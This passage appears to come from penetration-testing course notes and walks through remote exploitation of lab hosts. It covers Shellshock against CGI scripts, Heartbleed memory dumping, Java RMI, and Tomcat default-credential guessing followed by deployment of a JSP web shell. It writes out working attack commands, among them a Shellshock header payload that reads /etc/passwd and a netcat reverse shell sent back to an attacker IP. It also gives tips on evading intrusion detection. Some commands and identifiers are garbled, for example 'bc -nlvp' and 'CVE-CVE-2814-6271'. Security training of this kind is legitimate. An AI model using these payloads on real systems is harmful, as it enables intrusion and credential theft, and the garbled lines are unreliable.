Since we know that a primary attack vector was against vulnerable CGI programs, let's have a look at some things we can do to identify vulnerable programs and systems and then exploit.
  One of the first things we need to do is to locate CGI programs on a potentially vulnerable system. We can do this with an excellent tool called [dirsearch](https://github.com/maurosoria/dirsearch).
    Dirsearch is similar to some other tools you may be familiar with such as `dirb` or `dirbuster` and is used to execute dictionary-type attacks against web servers in search for interesting files, directories, etc.

    Some of the dirsearch's options can be seen below:
      ```
      root@tester:~/tools/dirsearch# ./dirsearch.py -h
      Usage: dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]

      Options:
        -h, --help                        show this help message and exit

        Mandatory:
          -u URL, --url=URL               URL target
          -L URLLIST, --url-list=URLIST   URL list target
          -e EXTENSIONS, --extensions=EXTENSIONS   
                                          Extension list seperated by comma (Example: php,asp)

        Dictionary Settings:
          -w WORDLIST, --wordlist=WORDLIST
          -l, --lowercase
          -f, --force-extensions          Force extensions for every wordlist entry (like in DirbuSter)

        General Settings:
          -s DELAY, --delay=DELAY         Delay between requests (float number)
          -r, --recursive                 Bruteforce recursively
      ```

    In order to find some CGI programs on a web server, we are going to utilize the `-e` (extensions) and the `-r` (recursive) options.

    A command like the following should be enough to find command `cgi-bin` directories, and then recursively check the `cgi-bin` directories for any common files with a `.cgi` extension:
      ```
      ./dirseach.py -u http://192.168.13.29/ -e cgi -r
      ```
      ```
      root@tester:~/tools/dirsearch# ./dirseach.py -u http://192.168.13.29/ -e cgi -r

       _|. _ _  _  _  _ _|_      v0.3.8
      ( ||| _) (/_(_|| (_| )

      Extensions: cgi | Threads : 10 | Wordlist size: 5980

      Error Log: /root/tools/dirsearch/logs/error-18-01-22_17-04-11.log

      Target: http://192.168.13.29/

      [17:04:11] Starting:
      [17:04:12] 200 -    0B  - ./bash_history
      [17:04:16] 403 -  294B  - /cgi-bin/
      [17:04:17] 200 -  112KB - /doc/
      [17:04:21] 403 -  299B  - /server-status
      [17:04:21] 403 -  300B  - /server-status/
      [17:04:23] Starting: cgi-bin/
      [17:04:30] 200 -  187B  - /cgi-bin/log.cgi
      [17:04:31] 500 -  623B  - /cgi-bin/php
      [17:04:31] 500 -  623B  - /cgi-bin/php/
      [17:04:31] 500 -  623B  - /cgi-bin/php/dev
      ```

      We can see from the output that `dirsearch` successfully identifies a `cgi-bin` directory (`403` : Unauthorized), in addition to a file called `login.cgi` (`200`: Accessable) file within that directory.

    Now that we have identified a `cgi` file on the server let's first confirm that we can access the file with a browser, maybe the page contains some hints as to its purpose. (see img-107)
      It looks like a login page for some sort of development system.

  Let's move on the identifying whether or not the `.cgi` program is vulnerable to shellshock.
    We can use the [http-shellshock](https://nmap.org/nsedoc/scripts/http-shellshock.html) Nmap NSE script for this.

    The following Nmap command will check the discovered CGI file for its potential to shellshock exploitation:
      ```
      nmap --script http-shellshock --script-args uri=/cgi-bin/log.cgi 192.168.13.29 -p 80
      ```

      Result
      ```
      PORT   STATE SERVICE
      80/tcp open  http
      | http-shellshock:
      |   VULNERABLE:
      |   HTTP Shellshock vulnerability
      |     State: VULNERABLE (Exploitable)
      |     IDs: CVE-CVE-2814-6271
      |         This web application might be affected by the vulnerability known as
      |         Shellshock. It seems the server is executing commands injected via  |         malicious HTTP headers.  
      ```

      From the NMAP NSE output above, we have confirmed that the file we discovered is likely vulnerable to shellshock. This is great news!

  To summarize our activities so far, we have:
  1. Identified a web server with a `cgi-bin` directory, containing a `login.cgi` file with `dirsearch`
  2. Confirmed that the file and/or server is likely vulnerable to Shellshock, with the `http-shellshock` NMAP NSE script

  Let's move onto exploring exploitation potential.

  There are multiple ways to exploit Shellshock to gain control over a system. Basically, we can execute any command we want on the remote system as the web server user if successful.
    To confirm this, let's start with a simple `wget` command to see if we can download the `/etc/passwd` file from the system.
      We can test that with the following command:
        ```
        wget -U "() {foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://192.168.13.29/cgi-bin/login.cgi && cat login.cgi
        ```

        The above `wget` command will issue a GET request to the target system, use a Shellshock-ified `User-Agent` (`-U`) to `echo` the contents of `/etc/passwd` to a local file on our attacker system (`login.cgi`), and will the display its contents to us (`&& cat login.cgi`)

      If successful, we should see the contents of the target systems' `/etc/passwd` file displayed in our terminal.

    Now that we have confirmed we can execute commands on the remote system, we can use that to our advantage.
      Like we did before, we'll have the target system execute `netcat` (assuming it exists) and call back to our attacker machine, where we'll set up a listener again.

      On our attacker system, we'll setup a `netcat` listener on port `1234` as we did for earlier exploits:
        ```
        bc -nlvp 1234
        ```

      Next, we will execute a `wget` command, but this time, with a `netcat` reverse shell payload as part of the `User-Agent` (`-U`) string against the target system:
        ```
        wget -U "() {foo;};echo; /bin/nc 192.168.13.18 1234 -e /bin/sh" http://192.168.13.29/cgi-bin/login.cgi && cat login.cgi
        ```

      If all is well, you should get back a reverse shell from the target, similar to the below.
        ```
        root@tester:~# wget -U "() {foo;};echo; /bin/nc 192.168.13.18 1234 -e /bin/sh" http://192.168.13.29/cgi-bin/login.cgi && cat login.cgi
        --2018-01-22 17:54:52-- http://192.168.13.29/cgi-bin/login.cgi
        Connecting to 192.168.13.29:80... connected
        HTTP request sent, awaiting response...
        ```
        ```
        root@tester:~# nc -nlvp 1234
        listening on [any] 1234 ...
        connect to [192.168.13.18] from (UNKNOWN) [192.168.13.29] 58535
        id
        uid=33(www-data) gid=(www-data) groups=33(www-data)
        uname -a
        Linux server3 2.6.24-16-server #1 SMP Thru Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
        ```

Once we have successfully exploited the target, and obtained a reverse shell, we can start our post-exploitation and post-enumeration tasks as will be covered in a later module.
  We suggest getting familiar with the different ways shellshock can be exploited, which browser HTTP headers we can use, ways to maintain persistence, etc.

___________________________________
## 3.4. Exploiting Heartbleed
[Heartbleed](http://heartbleed.com/), which surfaced in 2014, was a critical bug affecting OpenSSL versions 1.0.1 through 1.0.1f and allowed for the reading of encrypted data stored in memory due to a faulty implementation of the [TLS](https://en.wikipedia.org/wiki/Transport_Layer_Security) (Transport Layer Security) and [DTLS](https://en.wikipedia.org/wiki/Datagram_Transport_Layer_Security) (Datagram Transport Layer Security) protocols' heartbeat extension ([RFC6520](https://tools.ietf.org/html/rfc6520)).

In addition to the *dumping* of arbitrary encrypted data from a server, which could include anything from credentials for the application and any other sensitive data that might reside in memory at any given moment, it also allowed for dumping of the [Private Key](https://info.ssl.com/faq-what-is-a-private-key/) responsible for securing that data over SSL.
  Having this information allows an attacker to intercept all SSL traffic to and from an affected server, among other things.

There are several tools in circulation which allow for the exploitation of affected OpenSSL Implementation.
For this lesson, we will do a walkthrough with the exploit modules included within the Metasploit Framework.

Steps:
  First, we need to identify a vulnerable Open SSL Implementation.
    This can either be done with Nmap or metasploit.
    Nmap contains an NSE script (ssl-heartbleed.nse), which we can use to confirm our target  is vulnerable with the following command line.
      ```
      nmap --script ssl-heartbleed 192.168.13.58
      ```
      ```
      PORT      STATE SERVICE
      443/tcp   open  https
      | ssl-heartbleed:
      |    VULNERABLE
      |     The Heartbleed bus is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
      |     State: VULNERABLE
      |     Risk factor: High
      |         OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption key themselves.
      ```
      In the example above, we can see that Nmap was able to identify that our target is vulnerable to heartbleed.

  Once we have confirmed our target is vulnearble, we can use Metasploit's `openssl_heartbleed` auxiliary scanner module to dump encrypted memory contents.
    We can load the module with:
      ```
      msf > use auxiliary/scanner/ssl/openssl_heartbleed
      ```
      Note : Use `msf > show options` in order to show all the required parameters

    In most scenarios, we can stick with the defaults in regard to the module options.
    However, this particular module contains several Auxiliary actions, which we can see by running the `show actions` command
      ```
      msf auxiliary(scanner/ssl/openssl_heartbleed) > show actions

      Auxiliary actions:

          Name  Description
          ----  -----------
          DUMP  Dump memory contents
          KEYS  Recover private keys from memory
          SCAN  Check hosts for vulenerability
      ```

    The action we are going to use is the `DUMP` action.
    Set it with `set action DUMP` command along with our `RHOST` value, and then we can run the exploit:
      ```
      msf auxiliary(scanner/ssl/openssl_heartbleed) > set action DUMP
      action => DUMP
      msf auxiliary(scanner/ssl/openssl_heartbleed) > set RHOSTS 192.168.13.58
      RHOSTS => 192.168.13.58
      msf auxiliary(scanner/ssl/openssl_heartbleed) > run

      [+] 192.168.13.58:443     - Heartbet response with leak
      [+] 192.168.13.58:443     - Heartbleed data stored in /root/.msf4/loot/20180214115803_default_192.168.13.58_openssl.heartble_593912.bin
      [+] Scanned 1 of 1 hosts (100% complete)
      [+] Auxiliary module execution completed
      msf auxiliary(scanner/ssl/openssl_heartbleed) >
      ```

    Metasploit will store the results of the *leaked* data to a file in your `~/.msf4/loot` directory as a `.bin` file.
      We can simply run the `strings` command against the `.bin` file to see if we were able to leak anything we can use for our purposes
        ```
        root@tester:~/.msf4/loot# strings 20180214115803_default_192.168.13.58_openssl.heartble_593912.bin
        Accept: text/html,appplication/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-us,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: keep-alive
        Referer: https://192.168.13.58/index.html: username=admin@password=R3a77tStrong+Passw0rd%21%23%5E
        ```

        We can see that we have successfully leaked the username and password for a user of the application!

A note about Heartbleed, exploit scripts and modules that are circulating, if you don't get any *leaked* data from your first run of a specific tool, try again.
  You will find that different contents will appear at different times within the leaked memory segment of an application.

___________________________________
## 3.5. Exploiting Java RMI Registry
One usually under-appreciated, and overlooked class of vulnerabilities consistently found on Penetration Tests are those involving Java API's, particularly, services which offer way to invoke Java methods remotely, also known as [Java RMI](https://en.wikipedia.org/wiki/Java_remote_method_invocation).

In particular, there exists a vulnerability in default configurations of RMI Registry and RMI Activation Services, and affects what is known as the "[RMI Distributed Garbage Collector](http://java.sys-con.com/node/35865)" and essentially allows the loading of arbitrary Java classes from an attacker-defined URL.

The Java RMI Registry service is typically found on port `1099` TCP and can be fingerprinted with a Nmap version scan (`-sV`), and on Linux systems is identified by the *GNU Classparh grmiregistry* fingerprint as seen in the scan output below:
  ```
  nmap -sT 192.168.13.29 -p 1099 -sV
  ```
  ```
  Nmap scan report for server3 (192.168.13.29)
  Host is up (0.00027s latency).

  PORT      STATE SERVICE     VERSION
  1099/tcp  open  rmregistry  GNU Classpath grmregistry
  MAC Address: 00:0C:29:ED:4B:92 (VMware)
  Service Infor: Host: localhost
  ```

In addition to this Nmap scan version detection method, there is a Metasploit scanner module for detecting vulnerable RMI Endpoints, in addition to a Metasploit exploit module ([exploit/multi/misc/java_rmi_server](https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server)), which we will use for demonstrating this vulnerability.
  Once we have loaded the exploit module, the options available are straightforward, but we will cover some of them in the case we want to change some defaults.
    ```
    msf > use exploit/multi/misc/java_rmi_server
    msf > show options
    ```
    ```
    Module options (exploit/multi/msic/java_rmi_server):

      Name      Current Setting   Required    Description
      ----      ---------------   --------    -----------
      HTTPDELAY 10                yes         Time that the HTTP server will wait for the payload request
      RHOST                       yes         The target address
      RPORT     1899              yes         The target port (TCP)
      SRVHOST   0.0.0.0           yes         The local host to listen on. This must be an address on the local machine or 0.0.0.0
      SRVPORT   8080              yes         The local port to listen on.
      SSL       false             no          Negotiate SSL for incoming connections
      SSLCert                     no          Path to a custom SSL certificate (default is randomly generated)
      URIPATH                     no          The URI to use for this exploit (default is random)
    ```

    For the module options, we will change our `RHOST` value to our target machine as usual, and the `RPORT` can (most of the time) remain at the default as well.

    The `SRVHOST` and `SRVPORT` options are essentially what the module use as a web server that the target will use to download the Java payload from.

      The `SRVHOST` option is by default, set to `0.0.0.0` which means it should listen on any network interface and it is recommended to leave that option as is.

      If you encounter an error because you are running a service on port `8080`, you can change the `SRVPORT` to a port that is not currently in use.

    For additional IDS or Endpoint Detection evasion (if required for your specific target), you may also want to set `SSL` to `true`.
      This can help evading (some) on-the-wire heuristic detection solutions.
      However, most will flag many Metasploit modules' default SSL certificates.

      Hence the `SSLCert` option which allows you to specify your own custom SSL certificate for the `SRVHOST`

    As a general rule of thumb, in regard to Metasploit modules and exploits, where possible, always configure a custom SSL certificate for your listeners, etc.
      This goes a long way in evading Intrusion Detection Systems.

      Metasploit has been around a long time, and defenders have heavily analyzed the source code, and have written detection capabilities for most modules in their default configurations.

      For purpose of this lesson however, we can leave those options at their default settings.

  Once we have configured our options, we can attempt to exploit the target.
    Successful exploitation should look something like the following:
      ```
      msf exploit(multi/misc/java_rmi_server) > run -j
      [*] Exploit running as background job 0.

      [*] Started reverse TCP handler on 192.168.13.18:4444
      msf exploit(multi/misc/java_rmi_server) > [*] 192.168.13.29:1899 - Using URL: http://0.0.0.0:8080/J4GxqFl5
      [*] 192.168.13.29:1099 - Local IP: http://192.168.13.18:8080/J4GxqFl5
      [*] 192.168.13.29:1099 - Server started
      [*] 192.168.13.29:1099 - Sending RMI Header...
      [*] 192.168.13.29:1099 - Sending RMI Call...
      [*] 192.168.13.29:1099 - Replied to request for payload JAR
      [*] Sending stage (53837 bytes) to 192.168.13.29
      [*] Meterpreter session 1 opened (192.168.13.18:4444 -> 192.168.13.29:55725) at 2018-01-21 19:08:02 -0500
      ```

  We can then interact with our session and drop into a shell:
    ```
    msf exploit(multi/misc/java_rmi_server) > sessions -i 1
    [*] Starting interaction with 1...

    meterpreter > shell
    Process 1 created.
    Channel 1 created.
    id
    uid=0(root) gid=0(root)
    uname -a
    Linux server3 2.6.24-16-server #1 SMP ThU Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
    ```

  Once again, we can upgrade our shell with `pty.spawn()` python one-liner:
    ```
    python -c 'import pty: pty.spawn("/bin/sh")'
    sh-3.2# bash
    bash
    root@server3:/#
    ```

Important:
  The RMI Registry endpoint can sometimes be found listening on non-standard ports, and other ports which the service may require for other reasons.

  It is recommended that when assessing a target for this vulnerability, that you run a scan for all 65535 TCP port in the case that the RMI Registry has been configured to listen on ports other than 1099 TCP.

  That goes for virtually any service.

  Administrators often will change default listening ports for many common services, so be sure to conduct comprehensive port scans against your chosen targets.

___________________________________
## 3.6. Exploiting Java Deserialization
While staying on the topic of Java-based application or services, one particular class of vulnerabilities we should mention fall under the domain of *Java Deserialization* attacks, or in general, [Deserialization of Untrusted Data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data)

Java Deserialization vulnerabilities are one of the most *unspoken* vulnerabilities.

However, they appear to exist in many various applications, and the range of affected systems is likely very high, with recent research showing popular Java-based applications Jboss, WebLogic, WebSphere, and Jenkins to name a few, are affected by this class of vulnerability.

To explain it simply, **serialization** itself is a process which allows for applications to convert data into a binary format, which is suitable for saving to disk.
  In the case of this example, suitable for that data to be transferred over a network and into an application to be then **deserialized** and processed by the application as usable data again.

This process is vulnerable to the deserialization of untrusted *malicious* data, which can be supplied by the user, and is ultimately deserialized by an application resulting in code execution without even requiring authentication in most cases.

An excellent post which explains this process can be found [here](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)

If you'd like to experiment in a test environment with Java Deserialization vulnerabilities, you can find a great post on how to create a small, vulnerability environment at the following [link](https://zonksec.com/blog/hands-on-with-weblogic-serialization-vulnerability/)

___________________________________
## 3.7. Exploiting Tomcat
[Apache Tomcat](https://tomcat.apache.org/) is a widely used, free, and open source ([FOSS](https://en.wikipedia.org/wiki/Free_and_open-source_software)) web server used primarily for Java-based web applications.

One of the primary issues we encounter on engagements is the use of default or weak credentials for administrative interfaces for any number of appliances, web server applications, etc.

Tomcat has been known in the past to [ship with default credentials](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown), and often, System Administrators will leave them be for ease-of-use, forget about changing defaults, or whatever the case may be.

In regard to real-world experience, we can find that Apache Tomcat is encountered on most engagements at a very high frequency, as there is also a [Microsoft Windows version](https://tomcat.apache.org/download-70.cgi) available as well, making it the primary go-to for in-house Java-based web application server.

Tomcat is known to contain an area with its administrative interface known as the *Tomcat Manager*.
  The Tomcat Manager is an area of the web application that allows administrators to view settings for internal Tomcat configuration, system statistics quickly, and most importantly for our purposes, a method to easily deploy Java applications, as we will see shortly.

Determining if an Apache Tomcat server is using default credentials, can be easily as simply as browsing its web interface (typically found on port 8180 TCP), and trying some of the known defaults manually. Many times this works...

As we mentioned previously, services can be configured on whatever port the administrator desires, so always make sure to scan non-standard ports for common applications.

The default portal usually looks something like this (see img-155)

As Penetration Testers, the more efficiently we can conduct and automate certain tasks, the more time we have for exploitation, and other really fun things like writing the report!

With that said, *there is a tool for that*... in regards to dictionary attacks against the Tomcat Manager, that is.

  Metasploit includes an excellent utility for conducting password guessing attacks against Apache Tomcat servers, the [Tomcat Application Manager Login Utility](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login)

  You can load it from the following location via the Metasploit console:
    ```
    msf > use auxiliary/scanner/http/tomcat_mgr_login
    ```

  As with every Metasploit Module, they have their options.

  For the Manager Login module, we can (most of the time), stay with the defaults, and successfully crack the login, assuming it has been left with its default credentials, which is quite frequently.

  Once we set out `RHOST`,`RPORT`, and in this case, `STOP_ON_SUCCESS` options to `true`, we can then run the scanner module.

  Metasploit will use its built-in dictionary to check for default credentials.
    ```
    msf auxiliary(scanner/http/tomcat_mgr_login) > set Stop_ON_SUCCESS true
    Stop_ON_SUCCESS => true
    msf auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
    RPORT => 8180
    msf auxiliary(scanner/http/tomcat_mgr_login) > set RHOST 192.168.13.29
    RHOSTS => 192.168.13.29
    msf auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
    RPORT => 8180
    msf auxiliary(scanner/http/tomcat_mgr_login) > set STOP_ON_SUCESS true
    STOP_ON_SUCESS => true
    msf auxiliary(scanner/http/tomcat_mgr_login) >
    ```

  Once our options are configures, we can run the module, and if we are lucky, crack the credentials:
    ```
    [-] 192.168.13.29:8180 - LOGIN FAILED: tomcat:admin (Incorrect)
    [-] 192.168.13.29:8180 - LOGIN FAILED: tomcat:manager (Incorrect)
    [-] 192.168.13.29:8180 - LOGIN FAILED: tomcat:rolei (Incorrect)
    [-] 192.168.13.29:8180 - LOGIN FAILED: tomcat:root (Incorrect)
    [+] 192.168.13.29:8180 - Login Successful: tomcat:tomcat
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    ```

Once we have some valid credentials for the Tomcat Manager, we can explore our options in regard to exploiting this access, and to ultimately, control the system.

  Note:
    Experiment with the Tomcat Manager Login utility in regards to using different username list, password dictionaries, etc.

    We previously covered ways we can gather usernames through different methods of enumeration.

    Do not hesitate to use those same techniques in the case that a target application or appliance is not left configured with default credentials.

Once we have access to the Tomcat Manager area of the web server, we can see some already deployed applications. (see img-163)
  We also have a couple different options available to us in regards to deploying our own Java application (see img-164)

The quickest way to exploit this scenario is to use some tools that are already available to us.
  For this lesson, we are going to introduce a tool called *Laudanum*, and it is ready-made *JSP War Shell*

    You can download Laudanum [here](https://sourceforge.net/projects/laudanum/), or if you are using Kali Linux, can be found in the `/usr/share/laudanum/` directory.

    We are specifically interested in the `jsp` files.

    Within the `jsp` directory, we can already see a pre-compiled `cmd.war` application that should be ready for use.
      ```
      root@tester:/usr/share/laudanum/jsp# ls
      cmd.war   makewar.sh    warfiles
      root@tester:/usr/share/laudanum/jsp#
      ```

    The `cmd.war` application is essentially a java application, which if we can deploy successfully, will allow control of the server, and remote command execution.

  Uploading the war file to the application is straight-forward, and only requires we browse to the Laudanum `cmd.war` file, and upload it. (see img-167)

  Once we click the `Deploy` button, confirm the application is available, in the upper section of the Manager interface. (see img-168 like img-163)

  If the application deployed correctly we can browse to it with the following URL:
    ```
    http://192.168.13.29:8180/cmd/cmd.jsp
    ```
    (See img-169)

  We can now execute commands on the system from the JSP Shell (see img-170)

From here forward, there are multiple ways we can obtain a reverse shell from this system.

As we covered in previous sections how to do that, we will leave it as an exercise for the student in regards to getting a reverse netcat shell to your listener from the JSP Shell interface.
___________________________________
## 3.8. Remote Exploitation - Conclusion
Much of what we do as Penetration Testers boils down to creativity, persistence, and a drive to want to understand and learn as much as possible about the systems we are testing, ways we can make systems do what we want them to do, and the methods we can use to achieve our goals.

While in the labs, ang going through exercises, be sure to try different ways and methods to obtain good results.

(see vid-173)
___________________________________
